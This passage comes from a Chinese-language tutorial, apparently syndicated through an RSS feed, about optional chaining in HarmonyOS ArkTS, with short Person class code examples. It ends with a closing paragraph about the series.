    return this.nick ?? ''
  }
}
</code></pre>
<h5 data-id="heading-93">2.7.9.4 å¯é€‰é“¾</h5>
<p>åœ¨è®¿é—®å¯¹è±¡å±æ€§æ—¶ï¼Œ<strong>å¦‚æœè¯¥å±æ€§æ˜¯undefinedæˆ–è€…nullï¼Œå¯é€‰é“¾è¿ç®—ç¬¦ä¼šè¿”å›undefined</strong></p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class Person3 {
  nick: string | null = null;
  spouse?: Person3

  setSpouse(spouse: Person3): void {
    this.spouse = spouse;
  }

  getSpouseNick(): string | null | undefined {
    return this.spouse?.nick;
  }

  constructor(nick: string) {
    this.nick = nick;
    this.spouse = undefined;
  }
}
</code></pre>
<p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼š</p>
<ul>
<li><code>getSpouseNick</code>çš„è¿”å›ç±»å‹å¿…é¡»ä¸º<code>string | null | undefined</code>ï¼Œå› ä¸ºè¯¥æ–¹æ³•å¯èƒ½è¿”å›<code>null</code>æˆ–è€…<code>undefined</code></li>
<li>å¯é€‰é“¾å¯ä»¥ä»»æ„é•¿ï¼Œå¯ä»¥åŒ…å«ä»»æ„æ•°é‡çš„<code>?.</code>è¿ç®—ç¬¦</li>
</ul>
<p>åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œå¦‚æœPersonå®ä¾‹çš„spouseå±æ€§ä¸ä¸ºç©ºï¼Œå¹¶ä¸”spouseçš„nickå±æ€§ä¹Ÿä¸ä¸ºç©ºæ—¶ï¼Œè¾“å‡ºspouse.nickã€‚å¦åˆ™ï¼Œè¾“å‡ºundefined</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class Person {
  nick: string | null = null;
  spouse?: Person;

  constructor(nick: string) {
    this.nick = nick;
    this.spouse = undefined;
  }
}

let p: Person = new Person('Alice');
p.spouse?.nick; // undefined
</code></pre>
<h3 data-id="heading-94">3ã€ç»“æŸè¯­</h3>
<p>å¥½äº†ï¼ŒHarmonyOSé›¶åŸºç¡€è¯­æ³•åˆ°è¿™å°±ç»“æŸäº†ï¼Œçœ‹åˆ°è¿™é‡Œçš„å°ä¼™ä¼´æ­å–œä½ æŒæ¡äº†ArkTSè¯­æ³•ã€‚åæœŸæˆ‘ä¼šæŒç»­æ›´æ–°è¯¥ç³»åˆ—æ–‡ç« ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>